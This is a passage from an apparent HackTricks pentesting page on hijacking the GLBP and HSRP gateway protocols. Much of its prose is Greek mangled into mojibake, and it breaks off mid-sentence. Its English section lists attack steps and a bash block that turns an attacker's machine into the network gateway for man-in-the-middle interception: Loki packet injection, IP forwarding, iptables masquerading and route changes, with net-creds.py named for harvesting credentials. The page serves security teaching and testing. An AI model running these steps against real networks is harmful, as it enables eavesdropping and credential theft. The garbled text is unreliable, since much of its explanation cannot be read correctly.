# GLBP & HSRP Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## FHRP Hijacking Overview

### Insights into FHRP
Î¤Î¿ FHRP Î­Ï‡ÎµÎ¹ ÏƒÏ‡ÎµÎ´Î¹Î±ÏƒÏ„ÎµÎ¯ Î³Î¹Î± Î½Î± Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Î±Î½Î¸ÎµÎºÏ„Î¹ÎºÏŒÏ„Î·Ï„Î± ÏƒÏ„Î¿ Î´Î¯ÎºÏ„Ï…Î¿, ÏƒÏ…Î³Ï‡Ï‰Î½ÎµÏÎ¿Î½Ï„Î±Ï‚ Ï€Î¿Î»Î»Î¿ÏÏ‚ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î­Ï‚ ÏƒÎµ Î¼Î¹Î± ÎµÎ½Î¹Î±Î¯Î± ÎµÎ¹ÎºÎ¿Î½Î¹ÎºÎ® Î¼Î¿Î½Î¬Î´Î±, ÎµÎ½Î¹ÏƒÏ‡ÏÎ¿Î½Ï„Î±Ï‚ Î­Ï„ÏƒÎ¹ Ï„Î·Î½ ÎºÎ±Ï„Î±Î½Î¿Î¼Î® Ï†Î¿ÏÏ„Î¯Î¿Ï… ÎºÎ±Î¹ Ï„Î·Î½ Î±Î½Ï„Î¿Ï‡Î® ÏƒÎµ ÏƒÏ†Î¬Î»Î¼Î±Ï„Î±. Î— Cisco Systems ÎµÎ¹ÏƒÎ®Î³Î±Î³Îµ Ï€ÏÎ¿ÎµÎ¾Î­Ï‡Î¿Î½Ï„Î± Ï€ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î± ÏƒÎµ Î±Ï…Ï„Î® Ï„Î· ÏƒÎ¿Ï…Î¯Ï„Î±, ÏŒÏ€Ï‰Ï‚ Ï„Î¿ GLBP ÎºÎ±Î¹ Ï„Î¿ HSRP.

### GLBP Protocol Insights
Î— Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Ï„Î·Ï‚ Cisco, Ï„Î¿ GLBP, Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ ÏƒÏ„Î¿ TCP/IP stack, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ UDP ÏƒÏ„Î·Î½ Ï€ÏŒÏÏ„Î± 3222 Î³Î¹Î± ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î±. ÎŸÎ¹ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î­Ï‚ ÏƒÎµ Î¼Î¹Î± Î¿Î¼Î¬Î´Î± GLBP Î±Î½Ï„Î±Î»Î»Î¬ÏƒÏƒÎ¿Ï…Î½ Ï€Î±ÎºÎ­Ï„Î± "hello" ÏƒÎµ Î´Î¹Î±ÏƒÏ„Î®Î¼Î±Ï„Î± 3 Î´ÎµÏ…Ï„ÎµÏÎ¿Î»Î­Ï€Ï„Ï‰Î½. Î•Î¬Î½ Î­Î½Î±Ï‚ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î®Ï‚ Î´ÎµÎ½ ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Î±Ï…Ï„Î¬ Ï„Î± Ï€Î±ÎºÎ­Ï„Î± Î³Î¹Î± 10 Î´ÎµÏ…Ï„ÎµÏÏŒÎ»ÎµÏ€Ï„Î±, Î¸ÎµÏ‰ÏÎµÎ¯Ï„Î±Î¹ ÏŒÏ„Î¹ ÎµÎ¯Î½Î±Î¹ ÎµÎºÏ„ÏŒÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±Ï‚. Î©ÏƒÏ„ÏŒÏƒÎ¿, Î±Ï…Ï„Î¿Î¯ Î¿Î¹ Ï‡ÏÎ¿Î½Î¿Î´Î¹Î±ÎºÏŒÏ€Ï„ÎµÏ‚ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÏƒÏ„Î±Î¸ÎµÏÎ¿Î¯ ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½.

### GLBP Operations and Load Distribution
Î¤Î¿ GLBP Î¾ÎµÏ‡Ï‰ÏÎ¯Î¶ÎµÎ¹ ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ ÎºÎ±Ï„Î±Î½Î¿Î¼Î® Ï†Î¿ÏÏ„Î¯Î¿Ï… Î¼ÎµÏ„Î±Î¾Ï Ï„Ï‰Î½ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„ÏÎ½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î¼Î¹Î± ÎµÎ½Î¹Î±Î¯Î± ÎµÎ¹ÎºÎ¿Î½Î¹ÎºÎ® IP ÏƒÎµ ÏƒÏ…Î½Î´Ï…Î±ÏƒÎ¼ÏŒ Î¼Îµ Ï€Î¿Î»Î»Î±Ï€Î»Î­Ï‚ ÎµÎ¹ÎºÎ¿Î½Î¹ÎºÎ­Ï‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ MAC. Î£Îµ Î¼Î¹Î± Î¿Î¼Î¬Î´Î± GLBP, ÎºÎ¬Î¸Îµ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î®Ï‚ ÏƒÏ…Î¼Î¼ÎµÏ„Î­Ï‡ÎµÎ¹ ÏƒÏ„Î·Î½ Ï€ÏÎ¿ÏÎ¸Î·ÏƒÎ· Ï€Î±ÎºÎ­Ï„Ï‰Î½. Î£Îµ Î±Î½Ï„Î¯Î¸ÎµÏƒÎ· Î¼Îµ Ï„Î¿ HSRP/VRRP, Ï„Î¿ GLBP Ï€ÏÎ¿ÏƒÏ†Î­ÏÎµÎ¹ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ® ÎµÎ¾Î¹ÏƒÎ¿ÏÏÏŒÏ€Î·ÏƒÎ· Ï†Î¿ÏÏ„Î¯Î¿Ï… Î¼Î­ÏƒÏ‰ Î±ÏÎºÎµÏ„ÏÎ½ Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼ÏÎ½:

- **Host-Dependent Load Balancing:** Î”Î¹Î±Ï„Î·ÏÎµÎ¯ ÏƒÏ…Î½ÎµÏ€Î® Î±Î½Î¬Î¸ÎµÏƒÎ· Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÏ‰Î½ MAC AVF ÏƒÎµ Î­Î½Î±Î½ ÎºÏŒÎ¼Î²Î¿, Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿ Î³Î¹Î± ÏƒÏ„Î±Î¸ÎµÏÎ­Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ NAT.
- **Round-Robin Load Balancing:** Î— Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· Ï€ÏÎ¿ÏƒÎ­Î³Î³Î¹ÏƒÎ·, ÎµÎ½Î±Î»Î»Î¬ÏƒÏƒÎ¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Î±Î½Î¬Î¸ÎµÏƒÎ· Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÏ‰Î½ MAC AVF Î¼ÎµÏ„Î±Î¾Ï Ï„Ï‰Î½ Î±Î¹Ï„Î¿ÏÎ½Ï„Ï‰Î½ ÎºÏŒÎ¼Î²Ï‰Î½.
- **Weighted Round-Robin Load Balancing:** ÎšÎ±Ï„Î±Î½Î­Î¼ÎµÎ¹ Ï„Î¿ Ï†Î¿ÏÏ„Î¯Î¿ Î¼Îµ Î²Î¬ÏƒÎ· Ï€ÏÎ¿ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î± Î¼ÎµÏ„ÏÎ¹ÎºÎ¬ "Î’Î¬ÏÎ¿Ï‚".

### Key Components and Terminologies in GLBP
- **AVG (Active Virtual Gateway):** ÎŸ ÎºÏÏÎ¹Î¿Ï‚ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î®Ï‚, Ï…Ï€ÎµÏÎ¸Ï…Î½Î¿Ï‚ Î³Î¹Î± Ï„Î·Î½ ÎºÎ±Ï„Î±Î½Î¿Î¼Î® Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÏ‰Î½ MAC ÏƒÏ„Î¿Ï…Ï‚ Î¿Î¼ÏŒÏ„Î¹Î¼Î¿Ï…Ï‚ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î­Ï‚.
- **AVF (Active Virtual Forwarder):** ÎˆÎ½Î±Ï‚ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î®Ï‚ Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Î¿ÏÎ¹ÏƒÏ„ÎµÎ¯ Î½Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Ï„Î·Î½ ÎºÏ…ÎºÎ»Î¿Ï†Î¿ÏÎ¯Î± Ï„Î¿Ï… Î´Î¹ÎºÏ„ÏÎ¿Ï….
- **GLBP Priority:** ÎˆÎ½Î± Î¼ÎµÏ„ÏÎ¹ÎºÏŒ Ï€Î¿Ï… ÎºÎ±Î¸Î¿ÏÎ¯Î¶ÎµÎ¹ Ï„Î¿ AVG, Î¾ÎµÎºÎ¹Î½ÏÎ½Ï„Î±Ï‚ Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® 100 ÎºÎ±Î¹ ÎºÏ…Î¼Î±Î¹Î½ÏŒÎ¼ÎµÎ½Î¿ Î¼ÎµÏ„Î±Î¾Ï 1 ÎºÎ±Î¹ 255.
- **GLBP Weight:** Î‘Î½Ï„Î¹ÎºÎ±Ï„Î¿Ï€Ï„ÏÎ¯Î¶ÎµÎ¹ Ï„Î¿ Ï„ÏÎ­Ï‡Î¿Î½ Ï†Î¿ÏÏ„Î¯Î¿ ÏƒÎµ Î­Î½Î±Î½ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î®, ÏÏ…Î¸Î¼Î¹Î¶ÏŒÎ¼ÎµÎ½Î¿ ÎµÎ¯Ï„Îµ Ï‡ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î± ÎµÎ¯Ï„Îµ Î¼Î­ÏƒÏ‰ Object Tracking.
- **GLBP Virtual IP Address:** Î›ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Ï‰Ï‚ Î· Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· Ï€ÏÎ»Î· Ï„Î¿Ï… Î´Î¹ÎºÏ„ÏÎ¿Ï… Î³Î¹Î± ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½ÎµÏ‚ ÏƒÏ…ÏƒÎºÎµÏ…Î­Ï‚.

Î“Î¹Î± Ï„Î¹Ï‚ Î±Î»Î»Î·Î»ÎµÏ€Î¹Î´ÏÎ¬ÏƒÎµÎ¹Ï‚, Ï„Î¿ GLBP Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î· Î´ÎµÏƒÎ¼ÎµÏ…Î¼Î­Î½Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· multicast 224.0.0.102 ÎºÎ±Î¹ Ï„Î·Î½ Ï€ÏŒÏÏ„Î± UDP 3222. ÎŸÎ¹ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î­Ï‚ Î¼ÎµÏ„Î±Î´Î¯Î´Î¿Ï…Î½ Ï€Î±ÎºÎ­Ï„Î± "hello" ÏƒÎµ Î´Î¹Î±ÏƒÏ„Î®Î¼Î±Ï„Î± 3 Î´ÎµÏ…Ï„ÎµÏÎ¿Î»Î­Ï€Ï„Ï‰Î½ ÎºÎ±Î¹ Î¸ÎµÏ‰ÏÎ¿ÏÎ½Ï„Î±Î¹ Î¼Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÎ¿Î¯ ÎµÎ¬Î½ Ï‡Î±Î¸ÎµÎ¯ Î­Î½Î± Ï€Î±ÎºÎ­Ï„Î¿ Î³Î¹Î± Î´Î¹Î¬ÏÎºÎµÎ¹Î± 10 Î´ÎµÏ…Ï„ÎµÏÎ¿Î»Î­Ï€Ï„Ï‰Î½.

### GLBP Attack Mechanism
ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î³Î¯Î½ÎµÎ¹ Î¿ ÎºÏÏÎ¹Î¿Ï‚ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î®Ï‚ ÏƒÏ„Î­Î»Î½Î¿Î½Ï„Î±Ï‚ Î­Î½Î± Ï€Î±ÎºÎ­Ï„Î¿ GLBP Î¼Îµ Ï„Î·Î½ Ï…ÏˆÎ·Î»ÏŒÏ„ÎµÏÎ· Ï„Î¹Î¼Î® Ï€ÏÎ¿Ï„ÎµÏÎ±Î¹ÏŒÏ„Î·Ï„Î±Ï‚ (255). Î‘Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¿Î´Î·Î³Î®ÏƒÎµÎ¹ ÏƒÎµ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ DoS Î® MITM, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Ï€Î±ÏÎµÎ¼Ï€ÏŒÎ´Î¹ÏƒÎ· Î® Î±Î½Î±ÎºÎ±Ï„ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î·Ï‚ ÎºÏ…ÎºÎ»Î¿Ï†Î¿ÏÎ¯Î±Ï‚.

### Executing a GLBP Attack with Loki
[Loki](https://github.com/raizo62/loki_on_kali) Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¼Î¹Î± ÎµÏ€Î¯Î¸ÎµÏƒÎ· GLBP ÎµÎ¹ÏƒÎ¬Î³Î¿Î½Ï„Î±Ï‚ Î­Î½Î± Ï€Î±ÎºÎ­Ï„Î¿ Î¼Îµ Ï€ÏÎ¿Ï„ÎµÏÎ±Î¹ÏŒÏ„Î·Ï„Î± ÎºÎ±Î¹ Î²Î¬ÏÎ¿Ï‚ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î± ÏƒÎµ 255. Î¤Î± Î²Î®Î¼Î±Ï„Î± Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ· Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½ ÏŒÏ€Ï‰Ï‚ Î· ÎµÎ¹ÎºÎ¿Î½Î¹ÎºÎ® Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IP, Î· Ï€Î±ÏÎ¿Ï…ÏƒÎ¯Î± Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ ÎºÎ±Î¹ Î¿Î¹ Ï„Î¹Î¼Î­Ï‚ Ï€ÏÎ¿Ï„ÎµÏÎ±Î¹ÏŒÏ„Î·Ï„Î±Ï‚ Ï„Î¿Ï… Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î® Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ ÎµÏÎ³Î±Î»ÎµÎ¯Î± ÏŒÏ€Ï‰Ï‚ Ï„Î¿ Wireshark.

Attack Steps:
1. Switch to promiscuous mode and enable IP forwarding.
2. Identify the target router and retrieve its IP.
3. Generate a Gratuitous ARP.
4. Inject a malicious GLBP packet, impersonating the AVG.
5. Assign a secondary IP address to the attacker's network interface, mirroring the GLBP virtual IP.
6. Implement SNAT for complete traffic visibility.
7. Adjust routing to ensure continued internet access through the original AVG router.

By following these steps, the attacker positions themselves as a "man in the middle," capable of intercepting and analyzing network traffic, including unencrypted or sensitive data.

For demonstration, here are the required command snippets:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Monitoring and intercepting traffic can be done using net-creds.py or similar tools to capture and analyze data flowing through the compromised network.

### Passive Explanation of HSRP Hijacking with Command Details

#### Overview of HSRP (Hot Standby Router/Redundancy Protocol)
HSRP ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Î¹Î´Î¹ÏŒÎºÏ„Î·Ï„Î¿ Ï€ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î¿ Ï„Î·Ï‚ Cisco Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ ÏƒÏ‡ÎµÎ´Î¹Î±ÏƒÏ„ÎµÎ¯ Î³Î¹Î± Ï„Î·Î½ Î±Î½Î±Î³Î½Ï‰ÏƒÎ¹Î¼ÏŒÏ„Î·Ï„Î± Ï€ÏÎ»Î·Ï‚ Î´Î¹ÎºÏ„ÏÎ¿Ï…. Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î· Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· Ï€Î¿Î»Î»Î±Ï€Î»ÏÎ½ Ï†Ï…ÏƒÎ¹ÎºÏÎ½ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„ÏÎ½ ÏƒÎµ Î¼Î¹Î± ÎµÎ½Î¹Î±Î¯Î± Î»Î¿Î³Î¹ÎºÎ® Î¼Î¿Î½Î¬Î´Î± Î¼Îµ Î¼Î¹Î± ÎºÎ¿Î¹Î½Î® Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IP. Î‘Ï…Ï„Î® Î· Î»Î¿Î³Î¹ÎºÎ® Î¼Î¿Î½Î¬Î´Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Î­Î½Î±Î½ ÎºÏÏÎ¹Î¿ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î® Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Ï…Ï€ÎµÏÎ¸Ï…Î½Î¿Ï‚ Î³Î¹Î± Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î·Ï‚ ÎºÏ…ÎºÎ»Î¿Ï†Î¿ÏÎ¯Î±Ï‚. Î£Îµ Î±Î½Ï„Î¯Î¸ÎµÏƒÎ· Î¼Îµ Ï„Î¿ GLBP, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î¼ÎµÏ„ÏÎ¹ÎºÎ­Ï‚ ÏŒÏ€Ï‰Ï‚ Ï€ÏÎ¿Ï„ÎµÏÎ±Î¹ÏŒÏ„Î·Ï„Î± ÎºÎ±Î¹ Î²Î¬ÏÎ¿Ï‚ Î³Î¹Î± Ï„Î·Î½ ÎºÎ±Ï„Î±Î½Î¿Î¼Î® Ï†Î¿ÏÏ„Î¯Î¿Ï…, Ï„Î¿ HSRP Î²Î±ÏƒÎ¯Î¶ÎµÏ„Î±Î¹ ÏƒÎµ Î­Î½Î±Î½ Î¼ÏŒÎ½Î¿ ÎµÎ½ÎµÏÎ³ÏŒ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î® Î³Î¹Î± Ï„Î· Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· Ï„Î·Ï‚ ÎºÏ…ÎºÎ»Î¿Ï†Î¿ÏÎ¯Î±Ï‚.

#### Roles and Terminology in HSRP
- **HSRP Active Router**: Î— ÏƒÏ…ÏƒÎºÎµÏ…Î® Ï€Î¿Ï… Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Ï‰Ï‚ Ï€ÏÎ»Î·, Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Ï„Î· ÏÎ¿Î® Ï„Î·Ï‚ ÎºÏ…ÎºÎ»Î¿Ï†Î¿ÏÎ¯Î±Ï‚.
- **HSRP Standby Router**: ÎˆÎ½Î±Ï‚ ÎµÏ†ÎµÎ´ÏÎ¹ÎºÏŒÏ‚ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î®Ï‚, Î­Ï„Î¿Î¹Î¼Î¿Ï‚ Î½Î± Î±Î½Î±Î»Î¬Î²ÎµÎ¹ Î±Î½ Î±Ï€Î¿Ï„ÏÏ‡ÎµÎ¹ Î¿ ÎµÎ½ÎµÏÎ³ÏŒÏ‚ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î®Ï‚.
- **HSRP Group**: ÎˆÎ½Î± ÏƒÏÎ½Î¿Î»Î¿ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„ÏÎ½ Ï€Î¿Ï… ÏƒÏ…Î½ÎµÏÎ³Î¬Î¶Î¿Î½Ï„Î±Î¹ Î³Î¹Î± Î½Î± ÏƒÏ‡Î·Î¼Î±Ï„Î¯ÏƒÎ¿Ï…Î½ Î­Î½Î±Î½ ÎµÎ½Î¹Î±Î¯Î¿ Î±Î½Î¸ÎµÎºÏ„Î¹ÎºÏŒ ÎµÎ¹ÎºÎ¿Î½Î¹ÎºÏŒ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î®.
- **HSRP MAC Address**: ÎœÎ¹Î± ÎµÎ¹ÎºÎ¿Î½Î¹ÎºÎ® Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· MAC Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Î±Î½Î±Ï„ÎµÎ¸ÎµÎ¯ ÏƒÏ„Î¿Î½ Î»Î¿Î³Î¹ÎºÏŒ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î® ÏƒÏ„Î·Î½ ÎµÎ³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· HSRP.
- **HSRP Virtual IP Address**: Î— ÎµÎ¹ÎºÎ¿Î½Î¹ÎºÎ® Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IP Ï„Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚ HSRP, Ï€Î¿Ï… Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Ï‰Ï‚ Î· Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· Ï€ÏÎ»Î· Î³Î¹Î± Ï„Î¹Ï‚ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½ÎµÏ‚ ÏƒÏ…ÏƒÎºÎµÏ…Î­Ï‚.

#### HSRP Versions
Î¤Î¿ HSRP Î­ÏÏ‡ÎµÏ„Î±Î¹ ÏƒÎµ Î´ÏÎ¿ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚, HSRPv1 ÎºÎ±Î¹ HSRPv2, Ï€Î¿Ï… Î´Î¹Î±Ï†Î­ÏÎ¿Ï…Î½ ÎºÏ…ÏÎ¯Ï‰Ï‚ ÏƒÏ„Î· Ï‡Ï‰ÏÎ·Ï„Î¹ÎºÏŒÏ„Î·Ï„Î± Î¿Î¼Î¬Î´Î±Ï‚, Ï„Î· Ï‡ÏÎ®ÏƒÎ· multicast IP ÎºÎ±Î¹ Ï„Î· Î´Î¿Î¼Î® Ï„Î·Ï‚ ÎµÎ¹ÎºÎ¿Î½Î¹ÎºÎ®Ï‚ Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·Ï‚ MAC. Î¤Î¿ Ï€ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½ÎµÏ‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ multicast IP Î³Î¹Î± Ï„Î·Î½ Î±Î½Ï„Î±Î»Î»Î±Î³Î® Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚, Î¼Îµ Ï€Î±ÎºÎ­Ï„Î± Hello Ï€Î¿Ï… Î±Ï€Î¿ÏƒÏ„Î­Î»Î»Î¿Î½Ï„Î±Î¹ ÎºÎ¬Î¸Îµ 3 Î´ÎµÏ…Ï„ÎµÏÏŒÎ»ÎµÏ€Ï„Î±. ÎˆÎ½Î±Ï‚ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î®Ï‚ Î¸ÎµÏ‰ÏÎµÎ¯Ï„Î±Î¹ Î±Î½ÎµÎ½ÎµÏÎ³ÏŒÏ‚ Î±Î½ Î´ÎµÎ½ Î»Î·Ï†Î¸ÎµÎ¯ Ï€Î±ÎºÎ­Ï„Î¿ ÎµÎ½Ï„ÏŒÏ‚ 10 Î´ÎµÏ…Ï„ÎµÏÎ¿Î»Î­Ï€Ï„Ï‰Î½.

#### HSRP Attack Mechanism
ÎŸÎ¹ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ HSRP Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ Ï„Î·Î½ Î±Î½Î±Î³ÎºÎ±ÏƒÏ„Î¹ÎºÎ® Î±Î½Î¬Î»Î·ÏˆÎ· Ï„Î¿Ï… ÏÏŒÎ»Î¿Ï… Ï„Î¿Ï… Î•Î½ÎµÏÎ³Î¿Ï Î”ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î® Î¼Îµ Ï„Î·Î½ ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î® Î¼Î¹Î±Ï‚ Î¼Î­Î³Î¹ÏƒÏ„Î·Ï‚ Ï„Î¹Î¼Î®Ï‚ Ï€ÏÎ¿Ï„ÎµÏÎ±Î¹ÏŒÏ„Î·Ï„Î±Ï‚. Î‘Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¿Î´Î·Î³Î®ÏƒÎµÎ¹ ÏƒÎµ ÎµÏ€Î¯Î¸ÎµÏƒÎ· Man-In-The-Middle (MITM). ÎŸÏ…ÏƒÎ¹Î±ÏƒÏ„Î¹ÎºÎ¬ Î²Î®Î¼Î±Ï„Î± Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ· Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î·Î½ ÎµÎ³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· HSRP, Î· Î¿Ï€Î¿Î¯Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î³Î¯Î½ÎµÎ¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ Wireshark Î³Î¹Î± 